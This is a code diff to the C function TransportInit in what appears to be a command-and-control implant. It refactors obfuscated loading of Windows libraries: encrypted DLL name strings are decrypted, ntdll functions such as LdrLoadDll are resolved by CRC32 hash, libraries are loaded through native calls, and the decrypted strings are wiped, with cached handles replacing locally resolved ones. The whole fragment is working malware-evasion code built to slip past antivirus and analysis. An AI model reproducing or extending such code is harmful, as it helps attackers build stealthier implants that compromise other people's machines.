@@ -58,29 +58,21 @@ BOOL TransportInit( ) {
 
 #if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
-    UCHAR s_kernel32[] = S_KERNEL32;
     UCHAR s_advapi32[] = S_ADVAPI32;
     UCHAR s_iphlpapi[] = S_IPHLPAPI;
 
     UCHAR s_xkey[] = S_XK;
 
-    UCHAR d_kernel32[14] = {0};
     UCHAR d_advapi32[14] = {0};
     UCHAR d_iphlpapi[14] = {0};
 
-    ROL_AND_DECRYPT((CONST CHAR *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (CONST CHAR *)s_xkey);
     ROL_AND_DECRYPT((CONST CHAR *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (CONST CHAR *)s_xkey);
     ROL_AND_DECRYPT((CONST CHAR *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (CONST CHAR *)s_xkey);
 
-    HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);
+    HANDLE p_kernel32 = Instance.Handles.Kernel32Handle;
 
 #if CONFIG_NATIVE == TRUE
 
-#if CONFIG_ARCH == 64
-    VOID *p_ntdll = get_ntdll_64();
-#else
-    VOID *p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
     NTSTATUS status;
     UNICODE_STRING usAdvapi32;
     UNICODE_STRING usIphlpapi;
@@ -88,8 +80,8 @@ BOOL TransportInit( ) {
     pwcAdvapi32 = str_to_wide(d_advapi32);
     pwcIphlpapi = str_to_wide(d_iphlpapi);
 
-    LdrLoadDll_t p_LdrLoadDll = GetProcAddressByHash(p_ntdll, LdrLoadDll_CRC32B);
-    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    LdrLoadDll_t p_LdrLoadDll = GetProcAddressByHash(Instance.Handles.NtdllHandle, LdrLoadDll_CRC32B);
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
 
     p_RtlInitUnicodeString(&usAdvapi32, pwcAdvapi32);
     p_RtlInitUnicodeString(&usIphlpapi, pwcIphlpapi);
@@ -286,7 +278,6 @@ BOOL TransportInit( ) {
     }
 
     // zero out decrypted strings
-    mem_set(d_kernel32,0x0,str_len(s_kernel32));
     mem_set(d_advapi32,0x0,str_len(s_advapi32));
     mem_set(d_iphlpapi,0x0,str_len(s_iphlpapi));
 #endif
